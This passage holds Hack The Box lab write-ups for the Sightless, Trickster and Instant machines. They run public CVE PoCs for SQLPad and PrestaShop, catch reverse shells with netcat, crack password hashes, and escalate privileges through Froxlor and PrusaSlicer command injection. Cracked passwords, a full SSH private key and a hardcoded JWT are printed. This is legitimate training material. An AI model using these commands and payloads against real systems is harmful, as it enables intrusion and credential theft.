GenericLines: | 220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]| Invalid command: try being more creative|_ Invalid command: try being more creative22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)|_ 256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://sightless.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.94SVN%I=7%D=10/28%Time=671F52A6%P=x86_64-pc-linux-gnu%r(SF:GenericLines,A0,&quot;220\\x20ProFTPD\\x20Server\\x20\\(sightless\\.htb\\x20FTP\\x2SF:0Server\\)\\x20\\[::ffff:10\\.10\\.11\\.32\\]\\r\\n500\\x20Invalid\\x20command:\\x2SF:0try\\x20being\\x20more\\x20creative\\r\\n500\\x20Invalid\\x20command:\\x20try\\SF:x20being\\x20more\\x20creative\\r\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Oct 28 05:01:22 2024 -- 1 IP address (1 host up) scanned in 152.00 secondsFrom the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 22 is SSH and port 21 is FTP.Website - TCP 80First of all, we can add the IP to our /etc/host folder as sightless.htb0xStarlight@kali$ sudo nano /etc/host10.10.11.32 sightless.htbTake a look in the website, i can find a subdomain of sightless.htb is sqlpad.sightless.htb0xStarlight@kali$ sudo nano /etc/host10.10.11.32 sqlpad.sightless.htbFind some informations about sqlpad.sightless.htb website, it shows that the version of sqlpad is 6.10.0ExploitCracking CVE-2022-0944Now search some information about sqlpad version 6.10.0, i find a poc in a github repo CVE-2022-0944Download it and run the exploit scriptpython exploit.py http://sqlpad.sightless.htb 10.10.14.8 4444nc -nvlp 4444I have a root reverse shell, is it done. =))It just a root reverse shell of a docker container, check some information about the docker container.First, i read /etc/passwd and etc/shadow, and this have hash of password of michael userroot:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::daemon:*:19051:0:99999:7:::bin:*:19051:0:99999:7:::sys:*:19051:0:99999:7:::sync:*:19051:0:99999:7:::games:*:19051:0:99999:7:::man:*:19051:0:99999:7:::lp:*:19051:0:99999:7:::mail:*:19051:0:99999:7:::news:*:19051:0:99999:7:::uucp:*:19051:0:99999:7:::proxy:*:19051:0:99999:7:::www-data:*:19051:0:99999:7:::backup:*:19051:0:99999:7:::list:*:19051:0:99999:7:::irc:*:19051:0:99999:7:::gnats:*:19051:0:99999:7:::nobody:*:19051:0:99999:7:::_apt:*:19051:0:99999:7:::node:!:19053:0:99999:7:::michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::Copy this hash and using hashcat to find the password of michaelhashcat -m 1800 -a 0 hash ~/rockyou.txt$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposseNow, SSH with credentials michael and password insaneclownposse, we can take the user flagUser flag: 93a4faf6c3675fc9104f4ab2a4facaafPrivilege EscalationLinpeasTo start, i upload linpeas.sh and run. Read the report, we will see some special folders in /opt directory including google, this is a chrome debug file so we run chrome debug in this folder and SSH port forwardingssh -L 40263:127.0.0.1:40263 -L 8080:127.0.0.1:8080 -L 33060:127.0.0.1:33060 michael@10.10.11.32Use devtools in chrome open chrome://inspect/#devices in Google Chrome and add 127.0.0.1:40263 and inspect :Now we have credentials for Froxlor login in port 8080 with user admin and password ForlorfroxAdminThe Froxlor allow you to execute cmd with the permissions of user. Add shell commands to PHP-FPM versions, this shell will execute when PHP-FPM restart:cp /root/.ssh/id_rsa /tmp/id_rsaAfter that, go to settings, to PHP-FPM disable and enable to execute the commandmichael@sightless:/tmp$ lsCrashpad systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-logind.service-ld40RMid_rsa systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-resolved.service-YZpT2Isystemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-apache2.service-mdHAPw systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-timesyncd.service-coRIynsystemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-ModemManager.service-FFWiMK vmware-root_784-2966103535But permissions are not guaranteed for reading, so we need to execute chmod for this filechmod 644 /tmp/id_rsaAfter run chmod, the permissions of id_rsa are changedmichael@sightless:/tmp$ ls -latotal 68drwxrwxrwt 16 root root 4096 Oct 28 15:50 .drwxr-xr-x 18 root root 4096 Sep 3 08:20 ..drwx------ 6 john john 4096 Oct 28 15:19 Crashpaddrwxrwxrwt 2 root root 4096 Oct 28 15:17 .font-unixdrwxrwxrwt 2 root root 4096 Oct 28 15:17 .ICE-unix-rw-r--r-- 1 root root 3381 Oct 28 15:45 id_rsadrwx------ 3 john john 4096 Oct 28 15:19 .org.chromium.Chromium.CnWiU5drwx------ 2 john john 4096 Oct 28 15:19 .org.chromium.Chromium.qY7jSQdrwx------ 3 root root 4096 Oct 28 15:17 systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-apache2.service-mdHAPwdrwx------ 3 root root 4096 Oct 28 15:17 systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-ModemManager.service-FFWiMKdrwx------ 3 root root 4096 Oct 28 15:17 systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-logind.service-ld40RMdrwx------ 3 root root 4096 Oct 28 15:17 systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-resolved.service-YZpT2Idrwx------ 3 root root 4096 Oct 28 15:17 systemd-private-5fd37ac3a54d4175aa5c6a023a1d4967-systemd-timesyncd.service-coRIyndrwxrwxrwt 2 root root 4096 Oct 28 15:17 .Test-unixdrwx------ 2 root root 4096 Oct 28 15:17 vmware-root_784-2966103535drwxrwxrwt 2 root root 4096 Oct 28 15:17 .X11-unixdrwxrwxrwt 2 root root 4096 Oct 28 15:17 .XIM-unixRead private key and use it to SSH with root user-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNhAAAAAwEAAQAAAgEAvTD30GGuaP9aLJaeV9Na4xQ3UBzYis5OhC6FzdQN0jxEUdl6V31qlXlLFVw4Z54A5VeyQ928EeForZMq1FQeFza+doOuGWIId9QjyMTYn7p+1yVilp56jOm4DK4ZKZbpayoA+jy5bHuHINgh7AkxSeNQIRvKznZAt4b7+ToukN5mIj6w/FQ7hgjQarpuYroxY8ykJIBow5RKpUXiC07rHrPaXJLA61gxgZr8mheeahfvrUlodGhrUmvfrWBdBoDBI73hvqVcb989J8hXKk6wLaLnEaPjL2ZWlk5yPrSBziW6zta3cgtXY/C5NiR5fljitAPGtRUwxNSkfP8rXekiD+ph5y4mstcd26+lz4EJgJQkvdZSfnwIvKtdKvEoLlw9HOUiKmogqHdbdWt5PpnFPXkoNWdxoYUmrqHUasD0FaFrdGnZYVs1fdnnf4CHIyGC5A7GLmjPcTcFY1TeZ/BY1eoZLn7/XK4WBrkO4QqMoY0og2ZLqg7mWBvb2yXLv/d1vbFb2uCraZqmSo4kcR9z9Jv3VlR3Fy9HtIASjMbTj5bEDIjnm54mmglLI5+09V0zcZm9GEckhoIJnSdCJSnCLxFyOHjRzIv+DVANajxu5nlaGbiEyH4k0FGjjzJKxn+Gb+N5b2M1O3lS56SM5E18+4vT+k6hibNJIsApk4yYuOUAAAdIx7xPAMe8TwAAAAAHc3NoLXJzYQAAAgEAvTD30GGuaP9aLJaeV9Na4xQ3UBzYis5OhC6FzdQN0jxEUdl6V31qlXlLFVw4Z54A5VeyQ928EeForZMq1FQeFza+doOuGWIId9QjyMTYn7p+1yVilp56jOm4DK4ZKZbpayoA+jy5bHuHINgh7AkxSeNQIRvKznZAt4b7+ToukN5mIj6w/FQ7hgjQarpuYroxY8ykJIBow5RKpUXiC07rHrPaXJLA61gxgZr8mheeahfvrUlodGhrUmvfrWBdBoDBI73hvqVcb989J8hXKk6wLaLnEaPjL2ZWlk5yPrSBziW6zta3cgtXY/C5NiR5fljitAPGtRUwxNSkfP8rXekiD+ph5y4mstcd26+lz4EJgJQkvdZSfnwIvKtdKvEoLlw9HOUiKmogqHdbdWt5PpnFPXkoNWdxoYUmrqHUasD0FaFrdGnZYVs1fdnnf4CHIyGC5A7GLmjPcTcFY1TeZ/BY1eoZLn7/XK4WBrkO4QqMoY0og2ZLqg7mWBvb2yXLv/d1vbFb2uCraZqmSo4kcR9z9Jv3VlR3Fy9HtIASjMbTj5bEDIjnm54mmglLI5+09V0zcZm9GEckhoIJnSdCJSnCLxFyOHjRzIv+DVANajxu5nlaGbiEyH4k0FGjjzJKxn+Gb+N5b2M1O3lS56SM5E18+4vT+k6hibNJIsApk4yYuOUAAAADAQABAAACAEM80X3mEWGwiuA44WqOK4lzqFrY/Z6LRr1UeWpW2Fik4ZUDSScp5ATeeDBNt6Aft+rKOYlEFzB1n0m8+WY/xPf0FUmyb+AGhsLripIyX1iZI7Yby8eC6EQHVklvYHL29tsGsRU+Gpoy5qnmFlw4QiOj3Vj+8xtgTIzNNOT06BLFb5/xDt6Goyb2H/gmbM+6o43370gnuNP1cnf9d6IUOJyPR+ZJo7WggOuyZN7w0PScsCoyYiSo7ad7viF0k2sZvEqTE9U5GLqLqMToPw5Cq/t0H1IWIEo6wUAm/hRJ+64Dm7oh9k1aOYNDzNcwrFsahOt8QhUeRFhXyGPCHiwAjIFlaa+Ms+J9CQlSuyfm5xlKGUh+V9c9S6/J5NLExxldIOe/eIS7AcuVmkJQP7TcmXYyfM5OTrHKdgxX3q+Azfu67YM6W+vxC71ozUGdVpLBouY+AoK9Htx7Ev1oLVhIRMcCxQJ4YprJZLor/09Rqav+Q2ieMNOLDb+DSs+eceUsKEq0egIodE50YSkH/AKFNgnW1XBmnV0Hu+vreYD8saiSBvDgDDiOmqJjbgsUvararT80p/A5A211by/+hCuOgWvSnYYwWx18CZIPuxt3eZq5HtWnnv250I6yLCPZZF+7c3uN2iibTCUwo8YFsf1BDzpqTW3oZ3C5c5BmKBW/Cds7AAABAHxeoC+Sya3tUQBEkUI1MDDZUbpIjBmw8OIIMxR96qqNyAdmZdJC7pXwV52wV+zky8PR79L4lpoSRwguC8rbMnlPWO2zAWW5vpQZjsCj1iiU8XrOSuJoYIZ2XeUGAJe7JDb40G9EB14UAk6XjeU5tWb0zkKypA+ixfyW59kRlca9mRHEeGXKT+08Ivm9SfYtlYzbYDD/EcW2ajFKdX/wjhq049qPQNpOTE0bNkTLFnujQ78RyPZ5oljdkfxiw6NRi7qyhOZp09LBmNN241/dHFxm35JvVkLqr2cG+UTu0NtNKzMcXRxgJ76IvwuMqp+HxtJPzC/nyyujI/x1rg9B60AAAAEBAMhgLJFSewq2bsxFqMWL11rl6taDKj5pqEH36SStBZPwtASKvOOrCYzkNPqQYLtpqN4wiEX0RlcqawjjBxTtYKpEbosydNYk4DFo9DXpzK1YiJ/2RyvlE7XTUHRRgU7G8n8Q53zOjkXiQgMU8ayCmlFg0aCBYu+3yqp5deTiDVUVVn1GJf4b6jWuJkbyvyuVmkDYBHxpjscG0Z11ngNu89YhWmDZfu38sfEcV828cHUW2JJJ/WibCCzGRhG4K1gLTghLL+/cNo97CK/6XHaEhEOHE5ZWvNR6SaiGzhUQzmz9PIGRlLX7oSvNyanH2QORwocFF0z1Aj+6dwxnESdflQcAAAEBAPG196zSYV4oO75vQzy8UFpF4SeKBggjrQRoY0ExIIDrSbJjKavS0xeH/JTql1ApcPCOL4dEf3nkVqgui5/2rQqz901p3s8HGoAiD2SS1xNBQi6FrtMTRIRcgr46UchOtoTP0wPIliHohFKDIkXoglLtr8QBNBS7SEI+zTzlPVYZNw8w0fqcCh3xfjjy/DNm9KlxLdjvS21nQS9N82ejLZNHzknUb1fohTvnnKpEoFCWOhmIsWB9NhFf7GQV1lUXdcRy1fojHlAvysf4a4xuX72CXMyRfVGXTtK3L18SZksdrg0CAKgxnMGWNkgD6I/M+EwSJQmgsLPKtLfOAdSsE7MAAAASam9obkBzaWdodGxlc3MuaHRiAQ==-----END OPENSSH PRIVATE KEY-----Connect and WE ARE ROOT !!Root flag: 481222e5eef0cddca87bad64d9c9b602Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Trickster", "url": "/posts/HTB-Trickster-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "nmap, gobuster, ffuf, GitHack, CVE-2024-34716, docker, SSH Port Forwarding, hashcat, linpeas, CVE-2024-32651, OSCP", "date": "2024-10-25 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:┌──(kali㉿kali)-[~/htb/machine/trickster]└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.11.34 -o nmapStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 21:50 EDTNmap scan report for 10.10.11.34Host is up (0.27s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)|_ 256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Did not follow redirect to http://trickster.htb/|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 99.67 secondsFrom the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 22 is SSH.Website - TCP 80First of all, we can add the IP to our /etc/host folder as trickster.htbkali@kali$ sudo nano /etc/host10.10.11.34 trickster.htbTake a look in the website, i find a subdomain in site is shop.trickster.htb, add it to our /etc/host folderkali@kali$ sudo nano /etc/host10.10.11.34 shop.trickster.htbWebsite - SubdomainFirst, we take a look at the website, but nothing can be exploitedNow, we use gobuster to dirsearch the website┌──(kali㉿kali)-[~/htb/machine/trickster]└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://shop.trickster.htb/ -o gobuster_shop --exclude-length 283===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://shop.trickster.htb/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] Exclude Length: 283[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.git/HEAD (Status: 200) [Size: 28]Progress: 4614 / 4615 (99.98%)===============================================================Finished===============================================================That’s good, .git folder is public directory, so we see in .git folder manually or use GitHack to show all files in the directoryIn the .git folder, we can see index file, just cat the file, i can see an suspicious directory is admin634ewutrx1jgitlooaj, add the directory to the url, and an admin panel will be shownThe website is built with PrestaShop 8.1.5ExploitCVE-2024-34716Search for some information about PrestaShop 8.1.5, i find a poc for CVE-2024-34716Download and use this poc, take a request to http://shop.trickster.htb/ps_next_8_theme_malicious.zip and i get a RCE with user www-datapython exploit.py --url http://shop.trickster.htb/ --email ficstkeyfx@trickster.htb --local-ip &amp;lt;LOCAL-IP&amp;gt; --admin-path admin634ewutrx1jgitlooajSearch Config FileNow, we have a rce, stable shell by python and take a look at the folder, we will see some configuration files in website and see an suspicious about database configuration in /app/config/parameters.phppython3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&amp;lt;?php return array ( &#39;parameters&#39; =&amp;gt; array ( &#39;database_host&#39; =&amp;gt; &#39;127.0.0.1&#39;, &#39;database_port&#39; =&amp;gt; &#39;&#39;, &#39;database_name&#39; =&amp;gt; &#39;prestashop&#39;, &#39;database_user&#39; =&amp;gt; &#39;ps_user&#39;, &#39;database_password&#39; =&amp;gt; &#39;prest@shop_o&#39;, &#39;database_prefix&#39; =&amp;gt; &#39;ps_&#39;, &#39;database_engine&#39; =&amp;gt; &#39;InnoDB&#39;, &#39;mailer_transport&#39; =&amp;gt; &#39;smtp&#39;, &#39;mailer_host&#39; =&amp;gt; &#39;127.0.0.1&#39;, &#39;mailer_user&#39; =&amp;gt; NULL, &#39;mailer_password&#39; =&amp;gt; NULL, &#39;secret&#39; =&amp;gt; &#39;eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog&#39;, &#39;ps_caching&#39; =&amp;gt; &#39;CacheMemcache&#39;, &#39;ps_cache_enable&#39; =&amp;gt; false, &#39;ps_creation_date&#39; =&amp;gt; &#39;2024-05-25&#39;, &#39;locale&#39; =&amp;gt; &#39;en-US&#39;,So connect to the database with username ps_user and password prest@shop_o, and take a look, we can see information about user, employee and password of themMariaDB [prestashop]&amp;gt; select * from ps_employeeselect * from ps_employee -&amp;gt; ;;+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+| id_employee | id_profile | id_lang | lastname | firstname | email | passwd | last_passwd_gen | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+| 1 | 1 | 1 | Store | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25 | 2024-05-25 | 0000-00-00 | 0000-00-00 | 1 | NULL | NULL | default | theme.css | 1 | 0 | 1 | 1 | NULL | 5 | 0 | 0 | 2024-10-25 | NULL | 0000-00-00 00:00:00 | 0 || 2 | 2 | 0 | james | james | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL | NULL | NULL | NULL | 1 | NULL | NULL | NULL | NULL | 0 | 0 | 1 | 0 | NULL | 0 | 0 | 0 | NULL | NULL | NULL | 0 |+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+2 rows in set (0.000 sec)So we can see hash password of user james is $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm Use hashcat to find the password is alwaysandforeverSSH with username and password to take a foothold in system with user james and get user flag c6b11f1a10d1a79e17cf1de256a8b4c6Privilege EscalationTo start, i upload linpeas.sh and run. Read the report, i find out that docker is run now in network 172.17.0.1╔══════════╣ Interfaces# symbolic names for networks, see networks(5) for more information link-local 169.254.0.0docker0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:99:ad:29:a7 txqueuelen 0 (Ethernet) RX packets 642 bytes 1072906 (1.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 587 bytes 206731 (206.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0Now, upload fscan to find the IP in docker is on. First, find the IP address./fscan -h 172.17.0.1/24Second, we find the IP 172.17.0.2 is on, use fscan to find the port, and see port 5000 is available./fscan -h 172.17.0.1 -p 1-65535SSH Port Forwarding by user jamesssh -L 5000:172.17.0.2:5000 james@10.10.11.34The website now is forwarding to port 5000 in localhostTake to github repo of this website and see in security tab, that’s CVE-2024-32651 to server side command executeThis CVE show that the notification which can run Jinja2 code will run and send to the client while the website monitoring is changedSo we add my website to monitoring list and host a simple python server and add Jinja2 code to send reverse shell to my kaliRun netcat to listen in port 1234 and now we get reverse shell but this is not root in the real lab, it is just in docker system.After enumerating the docker containers, I found that there is /datastore , which seems to have some backup files and the like.root@a4b9a36ae7ff:/# cd /datastore root@a4b9a36ae7ff:/datastore# ls Backups secret.txt urlwatches.json b86f1003-3ecb-4125-b090-27e15ca605b9 url-list-with-tags.txt bbdd78f6-db98-45eb-9e7b-681a0c60ea34 url-list.txt root@a4b9a36ae7ff:/datastore# cd Backups root@a4b9a36ae7ff:/datastore/Backups# ls changedetection-backup-20240830194841.zip changedetection-backup-20240830202524.zip Take a look in this backup file and we can get the credentials of adam user is adam_admin992SSH with user adam and now check file sudo permissions can run with this usersudo -lMatching Defaults entries for adam on trickster: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser adam may run the following commands on trickster: (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicerCheck prusaslicer is version 2.6.1. Check some exploitable in prusaslicer 2.6.1, we can find exploit-dbSo we can edit the m3f in file in Metadata/Slic3r_PE.config in 2 lines Add the start of file ; post_process = &quot;chmod u+s /bin/bash&quot; Change file in line ; output_filename_format = exploit.gcodeNotice that cp the m3f to folder /tmp or something :vAnd now run with sudo permissionsadam@trickster:/opt/PrusaSlicer$ sudo ./prusaslicer -s /tmp/Trickster.3mf 10 =&amp;gt; Processing triangulated mesh10 =&amp;gt; Processing triangulated mesh20 =&amp;gt; Generating perimeters20 =&amp;gt; Generating perimeters30 =&amp;gt; Preparing infill45 =&amp;gt; Making infill30 =&amp;gt; Preparing infill10 =&amp;gt; Processing triangulated mesh20 =&amp;gt; Generating perimeters45 =&amp;gt; Making infill30 =&amp;gt; Preparing infill10 =&amp;gt; Processing triangulated mesh20 =&amp;gt; Generating perimeters45 =&amp;gt; Making infill30 =&amp;gt; Preparing infill10 =&amp;gt; Processing triangulated mesh20 =&amp;gt; Generating perimeters45 =&amp;gt; Making infill30 =&amp;gt; Preparing infill45 =&amp;gt; Making infill65 =&amp;gt; Searching support spots65 =&amp;gt; Searching support spots65 =&amp;gt; Searching support spots65 =&amp;gt; Searching support spots65 =&amp;gt; Searching support spots69 =&amp;gt; Alert if supports neededprint warning: Detected print stability issues:Loose extrusionsShape-Sphere, Shape-Sphere, Shape-Sphere, Shape-SphereCollapsing overhangShape-Sphere, Shape-Sphere, Shape-Sphere, Shape-SphereLow bed adhesionTRICKSTER.HTB, Shape-Sphere, Shape-Sphere, Shape-Sphere, Shape-SphereConsider enabling supports.Also consider enabling brim.88 =&amp;gt; Estimating curled extrusions88 =&amp;gt; Estimating curled extrusions88 =&amp;gt; Estimating curled extrusions88 =&amp;gt; Estimating curled extrusions88 =&amp;gt; Estimating curled extrusions88 =&amp;gt; Generating skirt and brim90 =&amp;gt; Exporting G-code to /tmp/exploit.gcodeSlicing result exported to /tmp/exploit.gcodeGet the /bin/bash of rootadam@trickster:/opt/PrusaSlicer$ /bin/bash -pbash-5.1#WE ARE ROOT NOW !!The root flag is 96320d5777db52741436c668e47c94c8Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Instant", "url": "/posts/HTB-Instant-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "nmap, gobuster, ffuf, jadx, linpeas, OSCP", "date": "2024-10-23 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:┌──(kali㉿kali)-[~/htb/machine/instant]└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.11.37 -o nmap# Nmap 7.94SVN scan initiated Wed Oct 23 02:45:56 2024 as: nmap -sV -sC --min-rate=1000 -p- -o nmap 10.10.11.37Nmap scan report for 10.10.11.37Host is up (0.27s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)|_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)80/tcp open http Apache httpd 2.4.58|_http-server-header: Apache/2.4.58 (Ubuntu)|_http-title: Did not follow redirect to http://instant.htb/Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Oct 23 02:47:42 2024 -- 1 IP address (1 host up) scanned in 106.42 secondsFrom the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 22 is SSH.Website - TCP 80First of all, we can add the IP to our /etc/host folder as instant.htbkali@kali$ sudo nano /etc/host10.10.11.37 instant.htbExploitTake a look in the website, and i can get an .apk file, download it and use jadx to convert to java code.jadx -d /home/kali/htb/machine/instant/out /home/kali/htb/machine/instant/instant.apkAnd find grep instant.htb to get some informationgrep -r instant.htbResult of grep command isgobuster:/css (Status: 301) [Size: 308] [--&amp;gt; http://instant.htb/css/]gobuster:/downloads (Status: 301) [Size: 314] [--&amp;gt; http://instant.htb/downloads/]gobuster:/img (Status: 301) [Size: 308] [--&amp;gt; http://instant.htb/img/]gobuster:/javascript (Status: 301) [Size: 315] [--&amp;gt; http://instant.htb/javascript/]gobuster:/js (Status: 301) [Size: 307] [--&amp;gt; http://instant.htb/js/]nmap:|_http-title: Did not follow redirect to http://instant.htb/nmap:Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelout/sources/com/instantlabs/instant/ProfileActivity.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/view/profile&quot;).addHeader(&quot;Authorization&quot;, accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1out/sources/com/instantlabs/instant/TransactionActivity.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/initiate/transaction&quot;).addHeader(&quot;Authorization&quot;, str4).post(RequestBody.create(MediaType.parse(&quot;application/json&quot;), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));out/sources/com/instantlabs/instant/TransactionActivity.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/confirm/pin&quot;).header(&quot;Authorization&quot;, this.val$access_token).post(RequestBody.create(MediaType.parse(&quot;application/json&quot;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2out/sources/com/instantlabs/instant/LoginActivity.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/login&quot;).post(RequestBody.create(MediaType.parse(&quot;application/json&quot;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4out/sources/com/instantlabs/instant/AdminActivities.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/view/profile&quot;).addHeader(&quot;Authorization&quot;, &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&quot;).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1out/sources/com/instantlabs/instant/RegisterActivity.java: new OkHttpClient().newCall(new Request.Builder().url(&quot;http://mywalletv1.instant.htb/api/v1/register&quot;).post(RequestBody.create(MediaType.parse(&quot;application/json&quot;), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3grep: out/resources/classes.dex: binary file matchesout/resources/res/xml/network_security_config.xml: &amp;lt;domain includeSubdomains=&quot;true&quot;&amp;gt;mywalletv1.instant.htbout/resources/res/xml/network_security_config.xml: &amp;lt;domain includeSubdomains=&quot;true&quot;&amp;gt;swagger-ui.instant.htbout/resources/res/layout/activity_forgot_password.xml: android:text=&quot;Please contact support@instant.htb to have your account recovered&quot;We can see the website have 2 subdomain is mywalletv1 and swagger-ui, add 2 host to /etc/hostsAnd a special information about a hardcode JWT token authentication of admin 